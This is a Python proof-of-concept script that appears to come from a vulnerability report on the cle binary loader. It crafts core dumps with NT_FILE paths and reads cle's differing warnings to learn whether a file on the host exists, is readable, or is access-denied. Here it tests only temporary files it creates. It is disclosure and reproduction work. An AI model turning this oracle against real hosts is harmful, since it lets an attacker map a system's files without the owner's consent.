#!/usr/bin/env python3
"""PoC 1a - NT_FILE filesystem oracle (sink S1, see common.py).

Three crafted core dumps differ only in the NT_FILE-named path. The three host
states (missing / exists+readable / exists+denied) surface as three distinct
warnings, so anyone who can observe cle's output can probe the host filesystem.

Expected on vulnerable cle (all releases): EXISTS_READABLE / DENIED / NOT_FOUND.
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
import cle  # noqa: E402

from lib.builders import build_core, capture_elfcore_warnings, classify_ntfile_warning  # noqa: E402


def probe(path, workdir):
    core = os.path.join(workdir, "probe.core")
    build_core([(0x400000, 0x401000, 0, path)], core)
    msgs = capture_elfcore_warnings(lambda: cle.Loader(core))
    return classify_ntfile_warning(msgs)


def main():
    print(f"cle {cle.__version__}, {__file__.split('/')[-1]}")
    with tempfile.TemporaryDirectory() as td:
        readable = os.path.join(td, "probe_readable.txt")
        with open(readable, "w") as f:
            f.write("plain text, not a loadable binary\n")
        denied = os.path.join(td, "probe_denied.bin")
        with open(denied, "wb") as f:
            f.write(b"x")
        os.chmod(denied, 0o000)  # run as non-root, else this case degrades to readable
        missing = os.path.join(td, "definitely_missing.so")

        got = {name: probe(path, td) for name, path in
               [("exists+readable", readable), ("permission denied", denied), ("missing", missing)]}
        for name, result in got.items():
            print(f"  {name:18} -> {result}")

        ok = got["exists+readable"] == "EXISTS_READABLE" and got["permission denied"] == "DENIED" and got["missing"] == "NOT_FOUND"
        print("RESULT:", "VULNERABLE - distinct warnings disclose host filesystem state" if ok
              else "NOT REPRODUCIBLE")


if __name__ == "__main__":
    main()
